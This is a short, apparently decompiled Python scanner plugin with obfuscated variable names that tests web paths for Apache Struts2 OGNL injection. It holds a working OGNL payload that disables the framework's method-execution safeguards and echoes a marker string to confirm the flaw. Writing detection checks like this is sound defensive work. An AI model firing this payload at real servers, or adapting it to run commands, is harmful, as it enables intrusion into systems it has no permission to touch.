# Embedded file name: struts.py
import urlparse
import time


def assign(service, arg):
    if service == "www":
        OO0o = urlparse.urlparse(arg)
        if OO0o.path.endswith(".action") or OO0o.path.endswith(".do"):
            return True, "%s://%s%s" % (OO0o.scheme, OO0o.netloc, OO0o.path)
    elif service == "struts":
        return True, arg


def audit(arg):
    ii11i = "('#_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('#context[\'xwork.MethodAccessor.denyMethodExecution\']=false')(b))&('#c')(('#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET')(c))&(g)(('#req=@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('#xman=@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('#xman=@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('#xman.getWriter().println(%22@websafescan@%22)')(d))&(i99)(('#xman.getWriter().close()')(d))=1"
    oOooOoO0Oo0O = '''@websafescan@'''
    iI1, i1I11i, OoOoOO00, I11i, O0O = curl.curl2('''%s?stamp=%s&%s''' % (arg, str(time.time()), ii11i))
    if OoOoOO00 and OoOoOO00.find(oOooOoO0Oo0O) != -1:
        security_hole(arg)
    else:
        iI1, i1I11i, OoOoOO00, I11i, O0O = curl.curl2(arg, '''stamp=%s&%s''' % (str(time.time()), ii11i))
        if OoOoOO00 and OoOoOO00.find(oOooOoO0Oo0O) != -1:
            security_hole(arg)


if __name__ == '__main__':
    from dummy import *

    # KEY---9a176f89756545161a807d6b5803333756eccaaad7ea2daa4e5eeb6c37a09ec0---
